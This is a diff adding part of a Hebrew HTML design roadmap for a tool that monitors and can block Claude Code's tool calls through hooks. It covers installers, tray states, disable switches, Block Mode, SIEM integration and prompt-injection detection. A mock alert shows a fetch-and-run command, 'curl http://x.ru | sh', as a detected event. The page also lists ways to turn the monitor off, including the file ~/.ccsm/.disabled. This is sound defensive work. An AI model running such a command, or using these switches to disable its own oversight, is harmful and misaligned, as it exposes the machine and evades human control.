+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">8.1</div>
+      <div class="task-title">Build Script</div>
+      <div class="task-desc">npm run build — אורז את כל הרכיבים לתיקייה אחת: agent + collector + dashboard + rules.</div>
+      <div class="task-tags"><span class="tag">build</span><span class="tag">npm</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.2</div>
+      <div class="task-title">ccsm-setup.exe / MSI</div>
+      <div class="task-desc">חבילת Windows — מתקין Node.js אם חסר, מוריד dependencies, מגדיר hooks, יוצר shortcuts.</div>
+      <div class="task-tags"><span class="tag">MSI</span><span class="tag">Windows</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.3</div>
+      <div class="task-title">install.ps1 — Silent</div>
+      <div class="task-desc">סקריפט PowerShell לפריסה שקטה ללא GUI. מתאים ל-GPO / RMM. פרמטר -CollectorURL לשרת מרכזי.</div>
+      <div class="task-tags"><span class="tag">PowerShell</span><span class="tag">silent</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.4</div>
+      <div class="task-title">Config Wizard</div>
+      <div class="task-desc">אשף הגדרות ראשוני: Telegram token, project folder, hardening level, API keys.</div>
+      <div class="task-tags"><span class="tag">wizard</span><span class="tag">UI</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.5</div>
+      <div class="task-title">Auto-Update</div>
+      <div class="task-desc">בדיקת גרסה חדשה בהפעלה. עדכון rules אוטומטי. לא משנה hooks ללא אישור.</div>
+      <div class="task-tags"><span class="tag">update</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.6</div>
+      <div class="task-title">Uninstaller</div>
+      <div class="task-desc">הסרה נקייה: מוחק hooks מsettings.json, עצירת שירותים, אופציה לשמירת logs.</div>
+      <div class="task-tags"><span class="tag">uninstall</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.7</div>
+      <div class="task-title">🛡 System Tray Icon</div>
+      <div class="task-desc">אייקון בשורת המשימות — סטטוס צבעוני, לחיצה ימנית לתפריט מהיר. בנוי עם node-systray.</div>
+      <div class="task-tags"><span class="tag">systray</span><span class="tag">GUI</span></div>
+    </div>
+    <div class="task-cell" style="border-top:2px solid rgba(239,68,68,0.3);background:rgba(239,68,68,0.04);">
+      <div class="task-num" style="color:var(--red);">8.8</div>
+      <div class="task-title" style="color:var(--red);">⏸ DISABLE / ENABLE Agent</div>
+      <div class="task-desc">כיבוי מיידי. 4 שיטות: System Tray, Dashboard toggle, Telegram, קובץ .ccsm-disable.</div>
+      <div class="task-tags"><span class="tag">disable</span><span class="tag">emergency</span></div>
+    </div>
+  </div>
+
+  <!-- Package contents -->
+  <div style="padding:16px 20px;border-top:1px solid var(--border);background:rgba(0,0,0,0.2);">
+    <div style="font-size:11px;font-weight:700;letter-spacing:1.5px;color:var(--muted2);text-transform:uppercase;margin-bottom:10px;">תוכן החבילה</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;">
+      <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--accent);font-weight:700;margin-bottom:3px;">📦 ccsm-agent/</div>
+        <div style="color:var(--muted2);">hook.js, rules.js, whitelist.json</div>
+      </div>
+      <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--accent);font-weight:700;margin-bottom:3px;">📦 ccsm-collector/</div>
+        <div style="color:var(--muted2);">server.js, schema.sql, alerts/</div>
+      </div>
+      <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,222,0.15);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--accent);font-weight:700;margin-bottom:3px;">📦 ccsm-dashboard/</div>
+        <div style="color:var(--muted2);">index.html, app.js, styles.css</div>
+      </div>
+      <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--accent);font-weight:700;margin-bottom:3px;">📦 ccsm-scanner/</div>
+        <div style="color:var(--muted2);">yara-rules/, secrets-patterns.json</div>
+      </div>
+      <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--accent);font-weight:700;margin-bottom:3px;">📦 install/</div>
+        <div style="color:var(--muted2);">setup.exe, install.ps1, wizard.html</div>
+      </div>
+      <div style="background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 12px;font-size:11px;">
+        <div style="color:var(--accent);font-weight:700;margin-bottom:3px;">📦 config/</div>
+        <div style="color:var(--muted2);">project-scope.json, skills-registry.json</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Install flow -->
+  <div style="padding:14px 20px;border-top:1px solid var(--border);">
+    <div style="font-size:11px;font-weight:700;letter-spacing:1.5px;color:var(--muted2);text-transform:uppercase;margin-bottom:10px;">זרימת התקנה — משתמש קצה</div>
+    <div style="display:flex;gap:0;flex-wrap:wrap;">
+      <div style="display:flex;align-items:center;gap:8px;background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 14px;margin:4px;font-size:12px;">
+        <span style="color:var(--accent);font-weight:800;">1</span>
+        <span style="color:var(--muted2);">הורד ccsm-setup.exe</span>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);margin:4px 2px;">→</div>
+      <div style="display:flex;align-items:center;gap:8px;background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 14px;margin:4px;font-size:12px;">
+        <span style="color:var(--accent);font-weight:800;">2</span>
+        <span style="color:var(--muted2);">הרץ כ-Admin</span>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);margin:4px 2px;">→</div>
+      <div style="display:flex;align-items:center;gap:8px;background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 14px;margin:4px;font-size:12px;">
+        <span style="color:var(--accent);font-weight:800;">3</span>
+        <span style="color:var(--muted2);">Wizard: Telegram + תיקייה + Level</span>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);margin:4px 2px;">→</div>
+      <div style="display:flex;align-items:center;gap:8px;background:rgba(14,165,233,0.07);border:1px solid rgba(14,165,233,0.15);border-radius:8px;padding:8px 14px;margin:4px;font-size:12px;">
+        <span style="color:var(--accent);font-weight:800;">4</span>
+        <span style="color:var(--muted2);">Hooks נכתבים לClaude</span>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);margin:4px 2px;">→</div>
+      <div style="display:flex;align-items:center;gap:8px;background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:8px 14px;margin:4px;font-size:12px;">
+        <span style="color:var(--green);font-weight:800;">✅</span>
+        <span style="color:var(--green);">Dashboard פתוח — מוכן!</span>
+      </div>
+    </div>
+  </div>
+
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> הרץ setup.exe על מחשב נקי → השלם wizard → פתח Claude → ודא event מגיע ל-dashboard</span>
+  </div>
+</div>
+
+<!-- SYSTEM TRAY SECTION -->
+<div class="section-title" style="margin-top:32px;">🛡 System Tray — ממשק מהיר</div>
+
+<!-- Tray overview -->
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px;">
+
+  <!-- Tray mockup -->
+  <div class="hw-card">
+    <div class="hw-card-title">תפריט לחיצה ימנית — עיצוב</div>
+    <div style="margin-top:12px;background:#1a1f2e;border:1px solid #2d3748;border-radius:10px;overflow:hidden;font-size:12px;max-width:220px;">
+
+      <!-- Header -->
+      <div style="background:#0f1623;padding:10px 14px;border-bottom:1px solid #2d3748;">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <div style="width:10px;height:10px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green);"></div>
+          <span style="font-weight:800;color:var(--text);">EHZ-SEC-AI</span>
+        </div>
+        <div style="font-size:10px;color:var(--muted2);margin-top:3px;">PC-ERAN-01 · Agent פעיל</div>
+      </div>
+
+      <!-- Stats -->
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;padding:8px 10px;border-bottom:1px solid #2d3748;gap:4px;">
+        <div style="text-align:center;">
+          <div style="font-size:16px;font-weight:900;color:var(--red);">2</div>
+          <div style="font-size:9px;color:var(--muted2);">Critical</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-size:16px;font-weight:900;color:var(--orange);">7</div>
+          <div style="font-size:9px;color:var(--muted2);">High</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-size:16px;font-weight:900;color:var(--accent);">247</div>
+          <div style="font-size:9px;color:var(--muted2);">Total</div>
+        </div>
+      </div>
+
+      <!-- Menu items -->
+      <div style="padding:4px 0;">
+        <div style="padding:7px 14px;color:var(--accent);font-weight:600;display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <span>📊</span> פתח Dashboard
+        </div>
+        <div style="padding:7px 14px;color:var(--text);display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <span>⚡</span> אירועים אחרונים
+        </div>
+        <div style="height:1px;background:#2d3748;margin:3px 0;"></div>
+        <div style="padding:7px 14px;color:var(--text);display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <span>🔕</span> Silent Mode
+        </div>
+        <div style="padding:7px 14px;color:var(--red);font-weight:600;display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <span>⏸</span> Disable Agent
+        </div>
+        <div style="height:1px;background:#2d3748;margin:3px 0;"></div>
+        <div style="padding:7px 14px;color:var(--text);display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <span>⚙️</span> הגדרות
+        </div>
+        <div style="padding:7px 14px;color:var(--muted2);display:flex;align-items:center;gap:8px;cursor:pointer;">
+          <span>❌</span> יציאה
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Tray icon states -->
+  <div class="hw-card">
+    <div class="hw-card-title">מצבי האייקון — צבע לפי סטטוס</div>
+    <div style="display:flex;flex-direction:column;gap:10px;margin-top:12px;">
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 12px;background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.2);border-radius:8px;">
+        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#0ea5e9,#10b981);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;">🛡</div>
+        <div>
+          <div style="font-weight:700;font-size:12px;color:var(--green);">● ACTIVE — כחול/ירוק</div>
+          <div style="font-size:11px;color:var(--muted2);">הכל תקין, Agent פעיל</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 12px;background:rgba(239,68,68,0.07);border:1px solid rgba(239,68,68,0.2);border-radius:8px;">
+        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#ef4444,#dc2626);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;animation:pulse 1s infinite;">🚨</div>
+        <div>
+          <div style="font-weight:700;font-size:12px;color:var(--red);">● ALERT — אדום פועם</div>
+          <div style="font-size:11px;color:var(--muted2);">יש CRITICAL/HIGH שלא טופל</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 12px;background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:8px;">
+        <div style="width:32px;height:32px;border-radius:8px;background:rgba(245,158,11,0.2);border:1px solid rgba(245,158,11,0.3);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;">⏸</div>
+        <div>
+          <div style="font-weight:700;font-size:12px;color:var(--yellow);">● DISABLED — צהוב</div>
+          <div style="font-size:11px;color:var(--muted2);">Agent כבוי ידנית</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;padding:10px 12px;background:rgba(107,114,128,0.07);border:1px solid rgba(107,114,128,0.2);border-radius:8px;">
+        <div style="width:32px;height:32px;border-radius:8px;background:rgba(107,114,128,0.2);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;">🔕</div>
+        <div>
+          <div style="font-weight:700;font-size:12px;color:var(--muted2);">● SILENT — אפור</div>
+          <div style="font-size:11px;color:var(--muted2);">פעיל, ללא התראות</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Tech + features -->
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px;">
+
+  <div class="hw-card">
+    <div class="hw-card-title">טכנולוגיה — node-systray</div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;margin-top:8px;">
+      <div class="hw-row"><span class="hw-label">חבילה</span><span class="hw-value ok">node-systray</span></div>
+      <div class="hw-row"><span class="hw-label">Windows</span><span class="hw-value ok">✅ תמיכה מלאה</span></div>
+      <div class="hw-row"><span class="hw-label">Linux</span><span class="hw-value ok">✅ AppIndicator</span></div>
+      <div class="hw-row"><span class="hw-label">התקנה</span><span class="hw-value ok">npm i node-systray</span></div>
+      <div class="hw-row"><span class="hw-label">Startup</span><span class="hw-value ok">רץ עם Windows (Task Scheduler)</span></div>
+      <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value ok">~15 MB בלבד</span></div>
+    </div>
+  </div>
+
+  <div class="hw-card">
+    <div class="hw-card-title">פעולות מהירות מה-Tray</div>
+    <div style="font-size:12px;color:var(--muted);line-height:2;margin-top:8px;">
+      <div style="display:flex;gap:8px;align-items:center;"><span style="color:var(--accent);">לחיצה כפולה</span><span style="color:var(--muted2);">→ פתח Dashboard</span></div>
+      <div style="display:flex;gap:8px;align-items:center;"><span style="color:var(--accent);">לחיצה שמאל</span><span style="color:var(--muted2);">→ popup סטטוס מהיר</span></div>
+      <div style="display:flex;gap:8px;align-items:center;"><span style="color:var(--accent);">לחיצה ימין</span><span style="color:var(--muted2);">→ תפריט מלא</span></div>
+      <div style="display:flex;gap:8px;align-items:center;"><span style="color:var(--red);">אייקון פועם</span><span style="color:var(--muted2);">→ יש CRITICAL לא טופל</span></div>
+      <div style="display:flex;gap:8px;align-items:center;"><span style="color:var(--yellow);">Tooltip</span><span style="color:var(--muted2);">→ "CCSM | 247 events | 2 CRITICAL"</span></div>
+      <div style="display:flex;gap:8px;align-items:center;"><span style="color:var(--green);">Notification</span><span style="color:var(--muted2);">→ Windows toast על CRITICAL</span></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Windows Toast notification -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">Windows Toast Notification — על CRITICAL</div>
+  <div style="display:flex;gap:16px;align-items:flex-start;margin-top:12px;flex-wrap:wrap;">
+    <div style="background:#1f2937;border:1px solid #374151;border-radius:12px;padding:14px 16px;min-width:280px;max-width:320px;">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+        <div style="width:20px;height:20px;border-radius:5px;background:linear-gradient(135deg,#0ea5e9,#6366f1);display:flex;align-items:center;justify-content:center;font-size:11px;">🛡</div>
+        <span style="font-size:11px;font-weight:700;color:var(--text);">EHZ-SEC-AI</span>
+        <span style="margin-right:auto;font-size:10px;color:var(--muted2);">עכשיו</span>
+      </div>
+      <div style="font-size:13px;font-weight:700;color:var(--red);margin-bottom:4px;">🚨 CRITICAL ALERT</div>
+      <div style="font-size:12px;color:var(--muted2);line-height:1.6;">
+        Tool: Bash<br>
+        Rule: curl_pipe_sh<br>
+        <span style="font-family:monospace;color:#fca5a5;font-size:11px;">curl http://x.ru | sh</span>
+      </div>
+      <div style="display:flex;gap:8px;margin-top:10px;">
+        <div style="background:rgba(239,68,68,0.2);border:1px solid rgba(239,68,68,0.3);border-radius:6px;padding:4px 12px;font-size:11px;font-weight:700;color:var(--red);cursor:pointer;">פרטים</div>
+        <div style="background:rgba(107,114,128,0.15);border:1px solid var(--border);border-radius:6px;padding:4px 12px;font-size:11px;color:var(--muted2);cursor:pointer;">סגור</div>
+      </div>
+    </div>
+    <div style="flex:1;min-width:200px;">
+      <div style="font-size:12px;color:var(--muted);line-height:2;">
+        <div class="hw-row"><span class="hw-label">Trigger</span><span class="hw-value ok">CRITICAL / HIGH בלבד</span></div>
+        <div class="hw-row"><span class="hw-label">חבילה</span><span class="hw-value ok">node-notifier</span></div>
+        <div class="hw-row"><span class="hw-label">כפתור "פרטים"</span><span class="hw-value ok">פותח Dashboard ישירות לevent</span></div>
+        <div class="hw-row"><span class="hw-label">Snooze</span><span class="hw-value ok">השתק 30 דקות</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="hw-note" style="margin-bottom:24px;">
+  💡 System Tray רץ כתהליך נפרד מהCollector — גם אם Dashboard סגור, האייקון תמיד נגיש. לחיצה כפולה = Dashboard נפתח בדפדפן הברירת מחדל.
+</div>
+
+<!-- DISABLE/ENABLE AGENT SECTION -->
+<div class="section-title" style="margin-top:32px;">⏸ כיבוי חירום — DISABLE / ENABLE Agent</div>
+
+<div class="hw-card" style="margin-bottom:16px;border-color:rgba(239,68,68,0.25);">
+  <div class="hw-card-title" style="color:#fca5a5;">מתי משתמשים בזה?</div>
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-top:10px;">
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:10px;font-size:12px;color:var(--muted);line-height:1.7;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:4px;">🔴 Agent גורם לאיטיות</div>
+      כיבוי מיידי ללא הסרה
+    </div>
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:10px;font-size:12px;color:var(--muted);line-height:1.7;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:4px;">🔴 False Positives רבים</div>
+      כיבוי זמני לכוונון חוקים
+    </div>
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:10px;font-size:12px;color:var(--muted);line-height:1.7;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:4px;">🔴 בדיקות פיתוח</div>
+      השתקה זמנית בזמן debug
+    </div>
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:10px;font-size:12px;color:var(--muted);line-height:1.7;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:4px;">🔴 עדכון Agent</div>
+      כיבוי לפני עדכון גרסה
+    </div>
+  </div>
+</div>
+
+<!-- 3 disable methods -->
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;margin-bottom:16px;">
+
+  <div class="hw-card" style="border-top:3px solid var(--accent);">
+    <div style="font-weight:800;font-size:13px;margin-bottom:10px;color:var(--accent);">שיטה 1 — Dashboard Toggle</div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;margin-bottom:10px;">
+      לחצן ON/OFF בולט ב-topbar. מיידי — Hook מפסיק לרוץ תוך שניה.
+      לוג מתועד: "Agent disabled by eran @ 14:32".
+    </div>
+    <div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;font-size:11px;color:#7dd3fc;font-family:monospace;line-height:1.8;">
+      POST /api/agent/disable<br>
+      { "reason": "manual", "user": "eran" }<br>
+      → hook.js מחזיר continue:true<br>
+      &nbsp;&nbsp;ללא בדיקות, ללא שליחה
+    </div>
+  </div>
+
+  <div class="hw-card" style="border-top:3px solid #25D366;">
+    <div style="font-weight:800;font-size:13px;margin-bottom:10px;color:#25D366;">שיטה 2 — Telegram Command</div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;margin-bottom:10px;">
+      שלח הודעה לבוט — עובד גם אם Dashboard לא נגיש.
+      מאפשר כיבוי מרחוק מהטלפון.
+    </div>
+    <div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;font-size:11px;color:#6ee7b7;font-family:monospace;line-height:1.8;">
+      /ccsm disable → Agent כבוי ✅<br>
+      /ccsm enable  → Agent פעיל ✅<br>
+      /ccsm status  → סטטוס נוכחי<br>
+      /ccsm disable 30m → כיבוי ל-30 דקות
+    </div>
+  </div>
+
+  <div class="hw-card" style="border-top:3px solid var(--yellow);">
+    <div style="font-weight:800;font-size:13px;margin-bottom:10px;color:var(--yellow);">שיטה 3 — קובץ .ccsm-disable</div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;margin-bottom:10px;">
+      יצירת קובץ בתיקיית הבית — hook בודק בכל הפעלה.
+      עובד גם אם Collector לא רץ.
+    </div>
+    <div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:10px;font-size:11px;color:#fde68a;font-family:monospace;line-height:1.8;">
+      # כיבוי:<br>
+      touch ~/.ccsm/.disabled<br>
+      <br>
+      # הפעלה מחדש:<br>
+      rm ~/.ccsm/.disabled
+    </div>
+  </div>
+
+</div>
+
+<!-- Disable flow -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">זרימת כיבוי — מה קורה כשAgent כבוי</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:2; font-family:monospace; margin-top:8px;">
+  Agent מקבל פקודת DISABLE
+          ↓
+  שומר state: { disabled: true, by: "eran", at: "14:32", reason: "manual" }
+          ↓
+  hook.js בודק state בכל tool call:
+    if (disabled) return { continue: true } // לא בודק, לא שולח
+          ↓
+  Telegram: "⏸ CCSM Agent כובה על PC-ERAN-01 ע"י ערן"
+          ↓
+  Dashboard: topbar מציג [⏸ DISABLED] באדום
+          ↓
+  לוג מקומי נמשך (קבצים בלבד, ללא שליחה לCollector)
+          ↓
+  Claude עובד רגיל — ללא עיכוב, ללא בדיקות
+  </pre>
+</div>
+
+<!-- Disable states table -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">מצבי Agent</div>
+  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-top:8px;">
+    <tr style="border-bottom:1px solid var(--border);">
+      <th style="padding:8px;text-align:right;color:var(--muted2);">מצב</th>
+      <th style="padding:8px;text-align:right;color:var(--muted2);">תיאור</th>
+      <th style="padding:8px;text-align:center;color:var(--muted2);">Hook רץ</th>
+      <th style="padding:8px;text-align:center;color:var(--muted2);">שולח Events</th>
+      <th style="padding:8px;text-align:center;color:var(--muted2);">לוג מקומי</th>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:8px;"><span style="color:var(--green);font-weight:700;">● ACTIVE</span></td>
+      <td style="padding:8px;color:var(--muted2);">פעיל מלא</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:8px;"><span style="color:var(--yellow);font-weight:700;">⏸ DISABLED</span></td>
+      <td style="padding:8px;color:var(--muted2);">כבוי ידנית</td>
+      <td style="text-align:center;padding:8px;color:var(--red);">❌</td>
+      <td style="text-align:center;padding:8px;color:var(--red);">❌</td>
+      <td style="text-align:center;padding:8px;color:var(--yellow);">⚠️ מינימלי</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:8px;"><span style="color:var(--orange);font-weight:700;">🔕 SILENT</span></td>
+      <td style="padding:8px;color:var(--muted2);">רץ אבל לא מתריע</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+      <td style="text-align:center;padding:8px;color:var(--red);">❌ אין Telegram</td>
+    </tr>
+    <tr>
+      <td style="padding:8px;"><span style="color:var(--red);font-weight:700;">🔴 ERROR</span></td>
+      <td style="padding:8px;color:var(--muted2);">Collector לא נגיש</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+      <td style="text-align:center;padding:8px;color:var(--red);">❌ מצבר מקומי</td>
+      <td style="text-align:center;padding:8px;color:var(--green);">✅</td>
+    </tr>
+  </table>
+</div>
+
+<div class="hw-note" style="background:rgba(16,185,129,0.07);border-color:rgba(16,185,129,0.25);color:var(--green);margin-bottom:24px;">
+  💡 מצב SILENT — שימושי בזמן פיתוח: Agent רץ ומתעד הכל, אבל לא שולח Telegram. מופעל ב: <span style="font-family:monospace;">/ccsm silent</span>
+</div>
+
+<!-- PHASE 9 (was 8) — Domain -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num b" style="font-size:13px;width:48px;height:48px;">9</div>
+    <div class="phase-info">
+      <h3>שלב 9 — Domain + Kamatera</h3>
+      <p>PostgreSQL, AD Auth, RBAC, GPO, Multi-machine Dashboard</p>
+    </div>
+    <div class="phase-status status-future">שלב ב</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">8.1</div>
+      <div class="task-title">הקמת Kamatera Lab</div>
+      <div class="task-desc">DC01 + CCSM-SRV + WS01. Private LAN. Ubuntu + Windows Server.</div>
+      <div class="task-tags"><span class="tag">Kamatera</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.2</div>
+      <div class="task-title">PostgreSQL Migration</div>
+      <div class="task-desc">מעבר מSQLite לPostgres. שמירת היסטוריה, indices, archiving.</div>
+      <div class="task-tags"><span class="tag">PostgreSQL</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.3</div>
+      <div class="task-title">AD Auth + RBAC</div>
+      <div class="task-desc">LDAP לAD. Admin/Analyst/ReadOnly. קבוצות CCSM-Admins/Analysts.</div>
+      <div class="task-tags"><span class="tag">AD</span><span class="tag">RBAC</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">8.4</div>
+      <div class="task-title">GPO Deploy</div>
+      <div class="task-desc">בדיקת Claude Code → התקנת Agent → hooks אוטומטי לכל תחנה.</div>
+      <div class="task-tags"><span class="tag">GPO</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> התחבר לDashboard עם משתמש AD → ראה events מ-WS01 → ודא RBAC חוסם Analyst מניהול חוקים</span>
+  </div>
+</div>
+
+<!-- PHASE 10 — Block Mode -->
+<div class="phase-block" style="margin-bottom:12px;">
+  <div class="phase-header">
+    <div class="phase-num c" style="font-size:13px;width:48px;height:48px;">10</div>
+    <div class="phase-info">
+      <h3>שלב 10 — Block Mode</h3>
+      <p>מעבר מניטור לחסימה אקטיבית — exit(1) עצור Claude</p>
+    </div>
+    <div class="phase-status status-future">שלב ג</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">9.1</div>
+      <div class="task-title">Block Engine</div>
+      <div class="task-desc">hook מחזיר exit(1) על CRITICAL rules. Claude נעצר לפני הפעולה.</div>
+      <div class="task-tags"><span class="tag">block</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">9.2</div>
+      <div class="task-title">Whitelist Override</div>
+      <div class="task-desc">ניהול חריגים לBlock Mode. Admin יכול לאשר override ספציפי.</div>
+      <div class="task-tags"><span class="tag">override</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> הפעל Block Mode → הרץ curl|sh → Claude נעצר → ודא event CRITICAL + Claude לא ביצע</span>
+  </div>
+</div>
+
+<!-- PHASE 11 — SIEM -->
+<div class="phase-block" style="margin-bottom:24px;">
+  <div class="phase-header">
+    <div class="phase-num d" style="font-size:13px;width:48px;height:48px;">11</div>
+    <div class="phase-info">
+      <h3>שלב 11 — SIEM + Network Monitor</h3>
+      <p>אינטגרציה עם Splunk/Sentinel, ניטור traffic, Network DLP</p>
+    </div>
+    <div class="phase-status status-future">שלב ד</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">10.1</div>
+      <div class="task-title">Syslog Connector</div>
+      <div class="task-desc">שליחת events בפורמט RFC 5424 לכל SIEM. UDP/TCP.</div>
+      <div class="task-tags"><span class="tag">Syslog</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">10.2</div>
+      <div class="task-title">Sentinel / Splunk</div>
+      <div class="task-desc">KQL queries לSentinel. Splunk dashboard templates מוכנים.</div>
+      <div class="task-tags"><span class="tag">SIEM</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">10.3</div>
+      <div class="task-title">Network Monitor</div>
+      <div class="task-desc">ניתוח traffic של Claude — לאיזה IP, כמה bytes, data exfiltration.</div>
+      <div class="task-tags"><span class="tag">network</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">10.4</div>
+      <div class="task-title">Prompt Injection — API</div>
+      <div class="task-desc">ניתוח תשובות API חיצוניות — האם מכילות הוראות זדוניות לClaude.</div>
+      <div class="task-tags"><span class="tag">injection</span></div>
+    </div>
+  </div>
+  <div style="background:rgba(16,185,129,0.07);border-top:1px solid var(--border);padding:12px 20px;font-size:12px;">
+    <span style="color:var(--green);font-weight:700;">✅ בדיקת קבלה:</span>
+    <span style="color:var(--muted2);"> ראה events ב-Sentinel → ודא Syslog מגיע → Network monitor מזהה WebFetch</span>
+  </div>
+</div>
+
+<!-- PHASE 12 — GAP FIX -->
+<div class="phase-block" style="margin-bottom:24px;border:1px solid rgba(188,140,255,0.3);">
+  <div class="phase-header" style="background:rgba(188,140,255,0.05);">
